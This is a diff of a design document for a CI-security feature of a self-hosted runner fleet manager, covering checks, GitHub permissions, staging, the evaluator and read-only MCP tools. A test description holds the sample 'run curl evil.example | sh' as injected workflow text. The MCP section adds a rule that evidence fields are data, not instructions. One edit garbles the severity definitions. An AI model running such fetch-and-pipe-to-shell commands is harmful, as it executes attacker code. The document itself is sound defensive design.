@@ -71,10 +71,10 @@ I chose the repository's reality in every row. None of them blocks the plan.
 
 | The brief says | The repository says | What I chose |
 | --- | --- | --- |
-| `.github/scripts/artifact-prune.sh` is a precedent. | It does not exist. `.github/scripts/` holds `ghcr-prune.sh`, `ghcr-prune-tags.sh`, `ghcr-check-tags.sh` and their tests. Nothing prunes Actions artifacts or caches; the only retention rule is `retention-days` on uploads in `ci.yml`. | The Storage dry-run rule is new. It takes the GHCR scripts' *principles* — reference-aware, a grace period, newest-N kept, fail closed on an unreadable listing — not their code. |
+| `.github/scripts/artifact-prune.sh` is a precedent. | It does not exist. `.github/scripts/` holds `ghcr-prune.sh`, `ghcr-prune-tags.sh`, `ghcr-check-tags.sh` and their tests. Nothing prunes Actions artifacts or caches; the only retention rule is `retention-days` on uploads in `ci.yml`. | The Storage dry-run rule is new. It takes the GHCR scripts' *principles* (reference-aware, a grace period, newest-N kept, fail closed on an unreadable listing) not their code. |
 | Suppressions "reuse dismissals, with a reason". | Migration `0077` (`internal/store/migrations/0077_problem_dismissals.sql`) is per user account, has no reason column, writes no audit row, and keys on a string the UI derives (`web/src/lib/problems/identity.ts`). It cannot carry a fleet-wide decision. | A new `kennel_waivers` table: fleet-wide, a mandatory reason and expiry, an audit row. It reuses the dismissals' *rules* (a worse severity re-surfaces; a finding that stops being reported retires its waiver) and the same menu vocabulary. Personal dismissal in the problems drawer stays exactly as it is. |
 | "The existing AI Context card moves in as one tab." | AI Context is one fleet-wide list page (`web/src/routes/AiContext.svelte`, 656 lines) with one card per repository, a setup wizard route, no tabs, no events, no settings row, and its own access model (`context.manage`, installation owners). Most of its users will never enable Kennel Club. | The page mounts unchanged at `/kennel/ai-context`, the card is extracted so the per-repository page can host the same component as its AI Context tab, the old paths stay as aliases, and nothing about AI Context depends on `kennel.enabled`. |
-| Stage 1 needs no new App permission and still checks "jobs without `timeout-minutes`". | The default App asks for `actions` read and `metadata` read, plus `organization_self_hosted_runners` write (org) or `administration` write (repo) (`internal/github/manifest.go:161-185`). It has no Contents permission, so no workflow file can be read, and the `jobs` table has no timeout, trigger or file-path column. | Stage 1 uses what the fleet *observed* plus Metadata and Actions reads. The static checks — `timeout-minutes`, `concurrency`, pinning, token permissions — move to Stage 3, the first stage that asks for a permission. |
+| Stage 1 needs no new App permission and still checks "jobs without `timeout-minutes`". | The default App asks for `actions` read and `metadata` read, plus `organization_self_hosted_runners` write (org) or `administration` write (repo) (`internal/github/manifest.go:161-185`). It has no Contents permission, so no workflow file can be read, and the `jobs` table has no timeout, trigger or file-path column. | Stage 1 uses what the fleet *observed* plus Metadata and Actions reads. The static checks (`timeout-minutes`, `concurrency`, pinning, token permissions) move to Stage 3, the first stage that asks for a permission. |
 | "Jobs queueing for a label no pool serves (Zoomies already has label advice)." | Label advice (`internal/scheduler/advice.go`) is about *size classes* (`too_small`, `unguaranteed`, `too_large`) and needs five measured runs. The unserved-label signal is `jobs.matched` and `JobFilter.UnmatchedOnly` (`internal/store/queries_events.go:495`), raised as `jobs.unmatched`. | `capacity.unserved_label` is the per-repository view of the second, not the first. |
 | Reuse `statusExempt` on the problem. | It is a function, not a field: `internal/controller/status.go:171`, a prefix test for `ai_context.`. | Add `kennel.` to it, for the reason its own comment gives: a standards finding has nothing to do with whether a developer's queued job will run. |
 | "Kennel Club" is a new name to theme. | "Kennel" is already the product's vocabulary: `internal/naming/kennel.go`, the runner state labels ("Back in the kennel", `web/src/lib/status.ts`) and a Settings switch that turns them off. | Kennel Club extends it. The *name* is container chrome and stays; the "Best in show" wording obeys the same switch; findings are never themed. |
@@ -90,8 +90,8 @@ Four smaller facts the stages rely on, each verified in the code:
 * `Probe` reads the App's *requested* permissions and then overwrites them with
   the installation's *granted* ones (`internal/github/app.go:216-247`), so
   "requested, awaiting the owner's acceptance" cannot be shown today.
-* `github.Repository` has six fields — no visibility, fork flag or push time
-  (`internal/github/client.go:327-334`) — although the listing it is filled from
+* `github.Repository` has six fields, no visibility, fork flag or push time
+  (`internal/github/client.go:327-334`), although the listing it is filled from
   carries them.
 * The package makes no conditional (`ETag`) requests and has no retry; backoff
   lives in the controller (`internal/controller/poller.go:331-382`).
@@ -127,8 +127,8 @@ State, don't ask. Each is repeated in section 10 where it is the owner's call.
 serves, and it already knows how their jobs actually ran: which were public,
 which pool ran them, how long they held a runner, which waited for a label
 nobody serves. **Kennel Club** is the section that turns that into a short list
-of things to fix, each in one plain sentence — what is wrong, why it matters to
-the fleet or to CI, and what to change — and offers a fix only where a fix is
+of things to fix, each in one plain sentence (what is wrong, why it matters to
+the fleet or to CI, and what to change) and offers a fix only where a fix is
 safe. It is not a security scanner and does not try to be OpenSSF Scorecard. A
 check belongs only if it answers *does this affect running CI, or the fleet that
 runs it?* Its advantage is the fleet: "this public repository's pull-request
@@ -137,7 +137,7 @@ repository scanner can say.
 
 **Recommended first release: Stage 1 alone, off by default.** It is read-only,
 asks GitHub for nothing it is not already allowed, and answers the highest-value
-question on the brief's list — *can a stranger run code on my runners?* — from
+question on the brief's list (*can a stranger run code on my runners?*) from
 evidence rather than configuration. Stages 2 to 4 each add one read; Stages 5
 and 6 are the only ones that write, and Stage 6 is optional.
 
@@ -147,8 +147,8 @@ and 6 are the only ones that write, and Stage 6 is optional.
 | 2 | Storage: artifacts and caches by name, and a dry run of what the default prune rule would free; workflow state | none | none |
 | 3 | Workflow files: timeouts, concurrency, pinning, token permissions, the sharper `pull_request_target` check | Contents: read | none |
 | 4 | Repository settings and required checks | Administration: read (org Apps) | none |
-| 5 | Fix by pull request, for the workflow edits that are safe | Contents, Pull requests, Workflows: write — the trio the migration wizard already asks for | pull requests only |
-| 6 | **Deferred.** Fix a setting, per check, with a preview and a recorded revert | Administration: write — never asked of an organisation App | one setting at a time, if ever built |
+| 5 | Fix by pull request, for the workflow edits that are safe | Contents, Pull requests, Workflows: write; the trio the migration wizard already asks for | pull requests only |
+| 6 | **Deferred.** Fix a setting, per check, with a preview and a recorded revert | Administration: write, never asked of an organisation App | one setting at a time, if ever built |
 
 ```mermaid
 flowchart TB
@@ -208,11 +208,11 @@ four bands, all fed by one derived `kennel.summary` frame:
    how many jobs the fleet ran for them. Each row names the worst finding by its
    title and links to the repository page.
 3. **By check.** A table of checks against the number of repositories each
-   affects — the view a platform team uses to ask "which repositories have no
+   affects; the view a platform team uses to ask "which repositories have no
    job timeouts?". On a phone it becomes a list of cards.
 4. **What Kennel Club can see.** One row per section (Fleet, Runs, Storage,
-   Workflows, Settings) with its state — *reading*, *not granted*, *waiting for
-   acceptance on GitHub*, *held for a rate limit*, *turned off* — the exact
+   Workflows, Settings) with its state (*reading*, *not granted*, *waiting for
+   acceptance on GitHub*, *held for a rate limit*, *turned off*) the exact
    permission it needs in the words GitHub's settings page uses, a link to the
    App's settings, and "Check again". This is the degradation surface, so it is
    on the Overview, not buried.
@@ -235,7 +235,7 @@ flowchart TB
     ai --> aic["GET and POST /ai-context/repositories/…"]
 ```
 
-* **Overview** — the default, and what the fleet itself knows about the
+* **Overview**: the default, and what the fleet itself knows about the
   repository, none of it read from GitHub
   ([decision 0008](decisions/0008-the-repository-page-leads-with-what-the-fleet-knows.md)).
   For the last 7 and 30 days, from routes that already exist:
@@ -251,13 +251,13 @@ flowchart TB
   page says it covers what the fleet still holds. After a rename the figures
   count only under the new name, because a job records its repository by name.
   There is no cost: none is kept per repository.
-* **CI** — what Kennel Club concluded: exposure, capacity, workflow files, token
+* **CI**: what Kennel Club concluded: exposure, capacity, workflow files, token
   permissions, with each finding's evidence and actions. (The brief's working
   title; it holds everything that concerns *running* CI.)
-* **Storage** — Stage 2.
-* **Protection** — Stage 4. Narrower than the brief's name suggests: only the
+* **Storage**: Stage 2.
+* **Protection**: Stage 4. Narrower than the brief's name suggests: only the
   required checks that can block or bypass CI (see section 3 for why).
-* **AI Context** — the existing card, same component, same endpoints, same access
+* **AI Context**: the existing card, same component, same endpoints, same access
   gates ([decision 0007](decisions/0007-the-repository-page-hosts-ai-context-and-adds-no-switch.md)).
   For a repository without it, the tab offers the existing setup wizard; it adds
   no switch and no pause.
@@ -277,7 +277,7 @@ it silences errors; starting again takes an operator.
 ### What happens to AI Context
 
 Everything it does today keeps working, and **independently of
-`kennel.enabled`** — a disabled feature starts nothing, but it must not take
+`kennel.enabled`**; a disabled feature starts nothing, but it must not take
 another feature down with it.
 
 | Today | After |
@@ -294,9 +294,9 @@ another feature down with it.
 
 ## 3. Check catalogue
 
-**Severity** reuses the problems' three: *error* — a stranger or a fault can
-already hurt the fleet or stop CI; *warning* — a guard is weaker than it should
-be, or capacity is being wasted; *info* — worth knowing, cheap to ignore. Reusing
+**Severity** reuses the problems' three: *error* (a stranger or a fault can
+already hurt the fleet or stop CI; *warning*) a guard is weaker than it should
+be, or capacity is being wasted; *info*, worth knowing, cheap to ignore. Reusing
 them means the existing severity badge and tone mapping are reused; the status
 colours are not touched, which `web/CLAUDE.md` forbids reusing for anything else.
 
@@ -312,21 +312,21 @@ Administration read.
 
 | Code | Detects | Data source | Permission | Severity | Safe fix | False-positive risk | Stage |
 | --- | --- | --- | --- | --- | --- | --- | --- |
-| `exposure.public_repo_on_fleet` | A public repository ran jobs on this fleet in the last 30 days, or has jobs queued for it | `jobs` (managed or unmatched), repository visibility from the installation's repository listing, the org runner group's `AllowsPublicRepositories` (`internal/github/client.go:204-215`) | — | warning; error when the next two also fire | No — moving a repository off the fleet is the operator's decision | Low: public plus ran is a fact. `internal` visibility is treated as private | 1 |
-| `exposure.public_repo_weak_pool` | The pool that ran a public repository's jobs is persistent, mounts the host Docker socket, uses `dind`, or runs as root | `jobs.pool_id`, `store.Pool.Dangerous()` (`internal/store/models.go:1067`) — the existing classification, not a second one | — | error | No (editing a pool is the existing `pool.dangerous` flow) | Low | 1 |
-| `exposure.fork_code_ran` | A run from a fork pull request executed on this fleet | `GET /repos/{r}/actions/runs/{id}` — `head_repository.id` ≠ `repository.id` — for runs the fleet ran | Actions: read | error | No | Low–moderate: a fork of a *trusted* contributor is still a fork; on a public repository GitHub cannot say who is a stranger. Waivable | 1 |
-| `exposure.target_event_ran` | A `pull_request_target`, `workflow_run`, `issue_comment` or `issues` run — events a stranger can trigger — executed on this fleet in a public repository | Same run read: `event` | Actions: read | warning | No | Medium: these events are safe unless the workflow executes attacker-controlled input. **Stage 3 sharpens it** to `ci.target_checkout_pr_head` and demotes this one to info when the file shows no such checkout | 1 |
-| `capacity.unserved_label` | Jobs waited more than ten minutes for a label no pool serves (per repository, last seven days) | `jobs.matched`, `JobFilter.UnmatchedOnly`; hosted-label jobs excluded as `store.HostedJob` already does | — | warning | No — add a pool or fix the label | Low. This is the per-repository view of `jobs.unmatched`, with a longer memory and no second problem raised | 1 |
-| `capacity.job_hit_default_limit` | A job ran to GitHub's six-hour default limit and was cancelled | `jobs.started_at`, `completed_at`, `conclusion` (duration within a minute of 360, concluded `cancelled`) | — | warning | Yes, Stage 5: add `timeout-minutes` from the job's own run history | Low. Narrow on purpose: it proves a missing limit only where one was reached, and says so | 1 |
-| `ci.workflow_auto_disabled` | GitHub disabled a workflow for inactivity (`disabled_inactivity`) — scheduled CI quietly stopped | `GET /repos/{r}/actions/workflows` | Actions: read | warning | No — re-enable it on GitHub | Low: GitHub's own state | 2 |
-| `storage.artifacts_large` | Actions artifacts hold more than 1 GiB (info) or 5 GiB (warning); names the largest groups and how long they are kept | `GET /repos/{r}/actions/artifacts` — `name`, `size_in_bytes`, `created_at`, `expires_at` | Actions: read | info / warning | Stage 6 can shorten retention; deletion is out of scope (section 11) | Low. A truncated listing says "at least" | 2 |
+| `exposure.public_repo_on_fleet` | A public repository ran jobs on this fleet in the last 30 days, or has jobs queued for it | `jobs` (managed or unmatched), repository visibility from the installation's repository listing, the org runner group's `AllowsPublicRepositories` (`internal/github/client.go:204-215`) | - | warning; error when the next two also fire | No, moving a repository off the fleet is the operator's decision | Low: public plus ran is a fact. `internal` visibility is treated as private | 1 |
+| `exposure.public_repo_weak_pool` | The pool that ran a public repository's jobs is persistent, mounts the host Docker socket, uses `dind`, or runs as root | `jobs.pool_id`, `store.Pool.Dangerous()` (`internal/store/models.go:1067`); the existing classification, not a second one | - | error | No (editing a pool is the existing `pool.dangerous` flow) | Low | 1 |
+| `exposure.fork_code_ran` | A run from a fork pull request executed on this fleet | `GET /repos/{r}/actions/runs/{id}`, `head_repository.id` ≠ `repository.id`, for runs the fleet ran | Actions: read | error | No | Low–moderate: a fork of a *trusted* contributor is still a fork; on a public repository GitHub cannot say who is a stranger. Waivable | 1 |
+| `exposure.target_event_ran` | A `pull_request_target`, `workflow_run`, `issue_comment` or `issues` run, events a stranger can trigger, executed on this fleet in a public repository | Same run read: `event` | Actions: read | warning | No | Medium: these events are safe unless the workflow executes attacker-controlled input. **Stage 3 sharpens it** to `ci.target_checkout_pr_head` and demotes this one to info when the file shows no such checkout | 1 |
+| `capacity.unserved_label` | Jobs waited more than ten minutes for a label no pool serves (per repository, last seven days) | `jobs.matched`, `JobFilter.UnmatchedOnly`; hosted-label jobs excluded as `store.HostedJob` already does | - | warning | No, add a pool or fix the label | Low. This is the per-repository view of `jobs.unmatched`, with a longer memory and no second problem raised | 1 |
+| `capacity.job_hit_default_limit` | A job ran to GitHub's six-hour default limit and was cancelled | `jobs.started_at`, `completed_at`, `conclusion` (duration within a minute of 360, concluded `cancelled`) | - | warning | Yes, Stage 5: add `timeout-minutes` from the job's own run history | Low. Narrow on purpose: it proves a missing limit only where one was reached, and says so | 1 |
+| `ci.workflow_auto_disabled` | GitHub disabled a workflow for inactivity (`disabled_inactivity`), scheduled CI quietly stopped | `GET /repos/{r}/actions/workflows` | Actions: read | warning | No, re-enable it on GitHub | Low: GitHub's own state | 2 |
+| `storage.artifacts_large` | Actions artifacts hold more than 1 GiB (info) or 5 GiB (warning); names the largest groups and how long they are kept | `GET /repos/{r}/actions/artifacts`, `name`, `size_in_bytes`, `created_at`, `expires_at` | Actions: read | info / warning | Stage 6 can shorten retention; deletion is out of scope (section 11) | Low. A truncated listing says "at least" | 2 |
 | `storage.caches_near_limit` | Actions caches are at or above 80% of the repository's cache limit, so entries are being evicted and builds are slower | `GET …/actions/cache/usage`, `…/cache/storage-limit` (10 GiB assumed if absent) | Actions: read | info | Stage 6 can lower the retention limit | Low | 2 |
 | `ci.no_timeout` | A job has no `timeout-minutes`, so a hung job holds a runner for GitHub's six-hour default | Workflow files; literal `timeout-minutes` only | Contents: read | warning (info for a job that never ran more than ten minutes) | Yes, Stage 5, only where run history supports a number | Medium: a reusable-workflow caller cannot set one; an expression is not judged | 3 |
 | `ci.no_concurrency` | A workflow triggered only by pull-request events has no `concurrency` group that cancels superseded runs | Workflow files | Contents: read | info | Yes, Stage 5, for pull-request-only workflows | Medium: some must not cancel; deploy and release triggers are never flagged | 3 |
 | `ci.target_checkout_pr_head` | A `pull_request_target` workflow checks out the pull request's head | Workflow files; `actions/checkout` with `ref`/`repository` taken from `github.event.pull_request.head.*` or `github.head_ref` | Contents: read | error (public) / warning (private) | No | Low for the explicit patterns it matches; it does not try to find every variant | 3 |
-| `token.permissions_unset` | A workflow and its jobs set no `permissions`, so they inherit the repository default, which on older repositories is read-write | Workflow files; with Stage 4's setting, silent when the default is read | Contents: read | warning (public) / info | No — the edit is only safe if the jobs need no more, which a parser cannot prove | Medium before Stage 4, low after | 3 |
+| `token.permissions_unset` | A workflow and its jobs set no `permissions`, so they inherit the repository default, which on older repositories is read-write | Workflow files; with Stage 4's setting, silent when the default is read | Contents: read | warning (public) / info | No; the edit is only safe if the jobs need no more, which a parser cannot prove | Medium before Stage 4, low after | 3 |
 | `ci.action_not_pinned` | A `uses:` names a tag or branch instead of a full commit | Workflow files | Contents: read | warning for third-party actions, info for `actions/*` and `github/*` | Yes, Stage 5: resolve the tag, keep the version as a comment, as this repository does (`TestEveryActionIsPinnedToACommitWithItsVersion`) | Low | 3 |
-| `ci.pins_without_updater` | Actions are pinned but nothing — no Dependabot `github-actions` entry, no Renovate config — will ever move the pins | `.github/dependabot.yml`; presence of Renovate config | Contents: read | info | No | Medium: other updaters exist | 3 |
+| `ci.pins_without_updater` | Actions are pinned but nothing (no Dependabot `github-actions` entry, no Renovate config) will ever move the pins | `.github/dependabot.yml`; presence of Renovate config | Contents: read | info | No | Medium: other updaters exist | 3 |
 | `ci.workflow_unreadable` | A workflow file was too large, malformed or too complex to judge | Parser result | Contents: read | info | No | None: it reports the limit, not a defect | 3 |
 | `token.default_write` | The repository's default workflow token permission is *write* | `GET …/actions/permissions/workflow` | Administration: read | warning | Stage 6, or a deep link to the exact setting | Low | 4 |
 | `exposure.fork_approval_weak` | A public repository served by the fleet requires approval only for first-time contributors *new to GitHub* | `GET …/actions/permissions/fork-pr-contributor-approval` | Administration: read | warning (error if `exposure.fork_code_ran` fired) | Stage 6, or a deep link | Low | 4 |
@@ -341,7 +341,7 @@ Administration read.
 | 2. Capacity waste | **Kept, split.** The observed half (a job hit the six-hour limit; jobs waited for an unserved label) is Stage 1. The static half (no `timeout-minutes`, no `concurrency`) needs files, so Stage 3. |
 | 3. Storage | **Kept, Stage 2, read-only.** Artifacts and caches work with Actions read. **GHCR packages are out of Stage 2**: installation tokens are not documented as able to call the Packages API. A reader returns `ErrUnsupported`, the tab says "not readable with a GitHub App token" and why, and the work waits for a live check. |
 | 4. Token and action hygiene | **Kept, Stage 3 and 4.** Pinning and unset `permissions` come from files; the repository default comes from settings. They are one finding family, so the evaluator joins them. |
-| 5. Default-branch protection | **Cut to its CI-relevant core.** Force-push, stale approvals and "is the branch protected" protect repository *integrity*; they do not decide whether CI runs or what the fleet executes (anyone with write access can already run a workflow from a branch). A required check no job produces *does* stop CI — so that one is kept as `protection.required_check_never_reports`, and the tab is narrower than its working title. |
+| 5. Default-branch protection | **Cut to its CI-relevant core.** Force-push, stale approvals and "is the branch protected" protect repository *integrity*; they do not decide whether CI runs or what the fleet executes (anyone with write access can already run a workflow from a branch). A required check no job produces *does* stop CI, so that one is kept as `protection.required_check_never_reports`, and the tab is narrower than its working title. |
 | 6. Repository hygiene (CODEOWNERS, SECURITY.md, secret scanning, push protection, Dependabot, delete-merged-branches) | **Dropped, except one slice.** None of it affects running CI or the fleet; Scorecard, GitHub's community profile and secret-scanning's own UI cover it. The slice kept is whether *Actions pins have an updater* (`ci.pins_without_updater`), because pinning without one is a defect in the pinning check itself. |
 | 7. AI Context readiness | **Kept as a tab.** Its existing problems and diagnosis stay; Kennel Club adds no second status for it. |
 | *Added:* runner-group public access | `AllowsPublicRepositories` on the org runner group is already read and stored on the group view. It is the most precise "can a stranger reach this runner" fact there is, so it feeds `exposure.public_repo_on_fleet`. |
@@ -376,10 +376,10 @@ exact preview. Removing any one of them stops the write.
 
 | Capability | GitHub permission | Level | Held by default? | Who grants | Stage |
 | --- | --- | --- | --- | --- | --- |
-| Fleet facts, repository visibility, run facts, workflow list, artifacts, caches | Metadata: read; Actions: read | A | Yes, every App (`manifest.go:161-185`) | — | 1, 2 |
+| Fleet facts, repository visibility, run facts, workflow list, artifacts, caches | Metadata: read; Actions: read | A | Yes, every App (`manifest.go:161-185`) | - | 1, 2 |
 | Workflow files and `dependabot.yml` | Contents: read | B | **No.** Present only on an App created with the migration option (Contents write, a superset) | The account owner accepts it on the installation | 3 |
 | Actions settings, fork-PR approval, default token permissions, classic branch protection | Administration: read | B | **Repo-scoped Apps: yes** (Administration write). **Org Apps: no** | Same | 4 |
-| Rulesets (listing and active rules for a branch) | Metadata: read | A | Yes. (`bypass_actors` needs Administration read; Kennel Club never reads it.) | — | 4 |
+| Rulesets (listing and active rules for a branch) | Metadata: read | A | Yes. (`bypass_actors` needs Administration read; Kennel Club never reads it.) | - | 4 |
 | Open a pull request that edits a workflow | Contents, Pull requests, Workflows: write | C | Only with the migration option | Same | 5 |
 | Change one repository setting | Administration: write | C | Repo-scoped Apps: yes. Org Apps: **no, and Kennel Club will not ask for it by default** | Same, plus `kennel.fixes` | 6 |
 
@@ -400,7 +400,7 @@ consent question:
 
 * `ManifestOptions` (`internal/github/manifest.go:19-58`) gains
   **`KennelWorkflows bool`** (adds `contents: read`) and **`KennelSettings bool`**
-  (adds `administration: read`, org Apps only — a repo App already holds
+  (adds `administration: read`, org Apps only: a repo App already holds
   `administration: write`). They are separate because they are separate
   sentences an operator can accept or refuse. `manifestPermissions` takes them;
   with `Migration` set, `contents` is already `write` and the read request is
@@ -423,7 +423,7 @@ consent question:
 
 Adding a permission to an existing App is held by GitHub until the account's
 owner accepts it on each installation; Zoomies cannot do that for them. What it
-can do — and today does not — is say precisely where the operator is in that
+can do, and today does not, is say precisely where the operator is in that
 sequence.
 
 1. **Say what is missing, in GitHub's words.** Extend `AppInfo` with
@@ -457,7 +457,7 @@ Every source a check reads has a coverage state, and a check whose source is not
 
 | State | Meaning | Shown as |
 | --- | --- | --- |
-| `ok` | Read in full | — |
+| `ok` | Read in full | - |
 | `partial` | A page cap was reached, or a sampled read | "Based on the newest 1,000 artifacts." A finding found in a partial read still stands; the *absence* of one does not count as "all clear". |
 | `denied` | HTTP 403 "Resource not accessible by integration" | The permission by name, from the matrix, and the grant steps. |
 | `unavailable` | 404/405 on this GitHub (an older GHES, a feature the repository does not have) | "This GitHub does not offer this setting." Never a finding. |
@@ -525,7 +525,7 @@ flowchart LR
 
 | Package | Rule |
 | --- | --- |
-| `internal/kennel` (new) | **Pure.** `Evaluate`, the check registry, the workflow parser, the prune planner. It imports **only the standard library's pure parts** — a stricter rule than the one `internal/provider` keeps, because the controller reduces what it needs from the store to plain data (a pool becomes a list of weakness words, a severity is its own string type that a test holds equal to `config.Severity`). No clock, no database, no network. `boundary_test.go` fails on any other import and on any call to `time.Now`, `Since`, `Until` or a timer, as `internal/provider`'s boundary test does for its own list. |
+| `internal/kennel` (new) | **Pure.** `Evaluate`, the check registry, the workflow parser, the prune planner. It imports **only the standard library's pure parts**; a stricter rule than the one `internal/provider` keeps, because the controller reduces what it needs from the store to plain data (a pool becomes a list of weakness words, a severity is its own string type that a test holds equal to `config.Severity`). No clock, no database, no network. `boundary_test.go` fails on any other import and on any call to `time.Now`, `Since`, `Until` or a timer, as `internal/provider`'s boundary test does for its own list. |
 | `internal/github` | A new narrow interface `RepoReader` in `kennel_reader.go`, type-asserted from `Client` exactly as `ContextRunReader` is (`internal/github/ai_context_runs.go:23-33`; `internal/controller/ai_context_diagnosis.go:40`), so the demo client simply does not implement it. `ListRepositories`' `Repository` gains `Visibility`; the data is already in the listing. A small conditional-request transport (`etag.go`, no dependency) that only Kennel Club's reads go through: its Stage 1 user is the repository listing it repeats every refresh. A run's trigger never changes, so each run is read once, and the transport earns its keep on the settings, artifact and cache reads of Stages 2 to 4. |
 | `internal/store` | `queries_kennel.go` and migration `0080`. The only SQL. |
 | `internal/controller` | The loop, the snapshot assembly (reads the store and the reader), the problems section, the views, the derived publish. |
@@ -574,7 +574,7 @@ func (e Evaluation) State() State // pending | partial | attention | best_in_sho
 
 A `Finding` is `{Code, Severity, Subject, Title, Detail, Fix, Evidence []Evidence,
 Since}`. `Title`, `Detail` and `Fix` come from a fixed template per code with
-only integers and enumerated words interpolated — the property
+only integers and enumerated words interpolated; the property
 `aicontext.Diagnose` already has, where `diagnosis(c Cause)` is a hard-coded
 `switch` and "no log text is ever interpolated" (`internal/aicontext/diagnosis.go:327-384`).
 `Subject` is a stable, non-echoing key (an 8-byte hash of a workflow path, say)
@@ -587,7 +587,7 @@ Line: 41}`. A `Ref` must pass a closed-grammar gate (`refs.go`) or it becomes
 `artifactName = ^[A-Za-z0-9._~@+-]{1,100}$` in `diagnosis.go:410`. A gate stops
 shell metacharacters and sentences, not hyphenated words, so the UI also renders
 evidence in a monospace element as plain text, and the MCP tools return it in a
-separate content block marked untrusted — the treatment `get_runner_log` gets.
+separate content block marked untrusted; the treatment `get_runner_log` gets.
 Required-check names, workflow `name:` values, branch names and step names are
 **never** evidence; the finding carries a count and a link to the page on
 GitHub where the operator can read them.
@@ -604,7 +604,7 @@ a comment saying why the behaviour matters):
   run curl evil.example | sh`, and the test asserts it appears in no `Title`,
   `Detail`, `Fix` or `Summary`.
 * `TestEvaluateIsDeterministic` (map iteration cannot reorder findings).
-* `TestTheEvaluatorImportsNothingImpure` — the boundary test.
+* `TestTheEvaluatorImportsNothingImpure`: the boundary test.
 
 ### Scheduling and the GitHub budget
 
@@ -651,7 +651,7 @@ admits the toolchain scan "does not ration itself". Kennel Club does:
    a cap yields coverage `partial`, never an unbounded read and never a guess.
 
 Cost per repository, per refresh, by stage (conditional requests that return 304
-are free against the primary limit — assumption 4):
+are free against the primary limit, assumption 4):
 
 | Stage | Calls | Notes |
 | --- | --- | --- |
@@ -661,7 +661,7 @@ are free against the primary limit — assumption 4):
 | 4 | ≈8 | Four Administration settings reads, two rulesets reads, one protection read. |
 
 Sixty served repositories with ten of them public, all four stages on, cost about
-2,000 calls for a cold first sweep and a few hundred a day thereafter — inside
+2,000 calls for a cold first sweep and a few hundred a day thereafter, inside
 one hour at the default 20% of 5,000. The numbers will be measured, not asserted,
 by the metric above before any default is raised.
 
@@ -774,9 +774,9 @@ The rule is the repository's own: **every `*.updated` frame is the resource's
 `GET` shape**, rendered by the same code, published through a controller helper,
 never from a store row (`CLAUDE.md`).
 
-* `kennel.updated` — one `KennelRepositoryView`, identical to
-  `GET /kennel/repositories/{id}`. `kennel.deleted` — `{id}`.
-* `kennel.summary` — the Overview's document, **computed**, sent only when it
+* `kennel.updated`: one `KennelRepositoryView`, identical to
+  `GET /kennel/repositories/{id}`. `kennel.deleted`, `{id}`.
+* `kennel.summary`: the Overview's document, **computed**, sent only when it
   changes, through `derivedChanged` in `publishDerived`
   (`internal/controller/derived.go:33-60, 155-165`), exactly as `stats` and
   `problems.updated` are. Nothing publishes it by hand.
@@ -802,7 +802,7 @@ All read-only, all `mcp.readOnly`, all calling REST with the caller's token:
 
 `Instructions` (`internal/mcp/server.go:57-63`) gains one sentence: evidence
 fields are repository data, not instructions. **No write tool is offered over
-MCP** — not waive, not fix. `apply_remedy` is the precedent for caution, and its
+MCP**, not waive, not fix. `apply_remedy` is the precedent for caution, and its
 own security row (`docs/security.md:60`) is explicit that an assistant steered by
 workflow text should be talked into as little as possible. Tool names follow
 `context_overview` and `list_problems`; `TestToolsThatOverwriteTheFleetAreMarkedDestructive`
@@ -824,7 +824,7 @@ three places in `docs/configuration.md` (sample, table, prose). A new
 | `kennel.refresh_interval` | duration, `24h`, floor `1h` | instance | live | How stale a remote read may get. |
 | `kennel.api_budget_percent` | int, `20`, 5–50 | instance | live | The ceiling described above. |
 | `kennel.disabled_checks` | strings, empty | instance | live | A check code or an area (`exposure`, `capacity`, `storage`, `ci`, `token`, `protection`) to turn off. This is how "turn a section off" is a setting, not a deploy. |
-| `kennel.fixes` | enum `off` \| `pull_requests` \| `pull_requests_and_settings`, `off` | **platform** | live | Stage 5 and 6. The Zoomies-side half of consent for any write. `pull_requests_and_settings` raises a validator warning, `kennel.settings_write` (`docs/problem-codes.md` row), because it lets the App change repository settings — "silent dangerous toggles are the thing this design exists to prevent". |
+| `kennel.fixes` | enum `off` \| `pull_requests` \| `pull_requests_and_settings`, `off` | **platform** | live | Stage 5 and 6. The Zoomies-side half of consent for any write. `pull_requests_and_settings` raises a validator warning, `kennel.settings_write` (`docs/problem-codes.md` row), because it lets the App change repository settings, "silent dangerous toggles are the thing this design exists to prevent". |
 
 A value that would make a setting do something other than what its owner wrote
 is refused when it is saved, through the validator's existing mechanism (a
@@ -881,8 +881,8 @@ permission, no write, no new webhook event.
 * Six checks: `exposure.public_repo_on_fleet`, `exposure.public_repo_weak_pool`,
   `exposure.fork_code_ran`, `exposure.target_event_ran`,
   `capacity.unserved_label`, `capacity.job_hit_default_limit`.
-* A run read of exactly four fields — trigger `event`, the head and base
-  repository IDs, and the run ID — for runs the fleet ran in *public*
+* A run read of exactly four fields (trigger `event`, the head and base
+  repository IDs, and the run ID) for runs the fleet ran in *public*
   repositories only. Actor, branch, title, the workflow's `path` and every other
   string on a run are not read. The path is the one field of a run a fork's author
   chooses, and no Stage 1 check uses it, so it is not taken until Stage 3 joins a
@@ -958,10 +958,10 @@ the feature off:
 
 **Packages and files** (new unless marked):
 
-* `internal/kennel/` — `check.go` (registry, `Codes`), `snapshot.go`,
+* `internal/kennel/`: `check.go` (registry, `Codes`), `snapshot.go`,
   `evaluate.go`, `exposure.go`, `capacity.go`, `coverage.go`, `waiver.go`,
   `refs.go`, `state.go`, each with its `_test.go`, and `boundary_test.go`.
-* `internal/github/` — `kennel_reader.go`, `etag.go`, `fake_kennel.go`;
+* `internal/github/`: `kennel_reader.go`, `etag.go`, `fake_kennel.go`;
   modified: `client.go` (`Repository` gains `Visibility`, and nothing else until
   a check needs it), `migrate.go` (`repositoryOf` fills it, and reads it from
   `private` on an older server that omits it; the listing is shared between the
@@ -972,29 +972,29 @@ the feature off:
   endpoints stop hard-coding `"private": true`). `Probe` keeping the App's
   requested permissions beside the granted ones moves to Stage 3, where the
   grant flow first needs it.
-* `internal/store/` — `migrations/0080_kennel_club.sql`, `queries_kennel.go`,
+* `internal/store/`: `migrations/0080_kennel_club.sql`, `queries_kennel.go`,
   `ids.go`; modified: `migrations_test.go`.
-* `internal/controller/` — `kennel.go` (the loop, the reads, the evaluation),
+* `internal/controller/`: `kennel.go` (the loop, the reads, the evaluation),
   `kennel_snapshot.go` (the run watermark, the pool-to-danger words, the digests),
   `kennel_budget.go`, `kennel_views.go`, `kennel_problems.go`; modified:
   `controller.go` (the runtime, the spawn, announcing an installation's rows
   before it is deleted), `derived.go`, `background.go` (the prune), `problems.go`
   (the section and `problemAudience` rows), `status.go` (`statusExempt`),
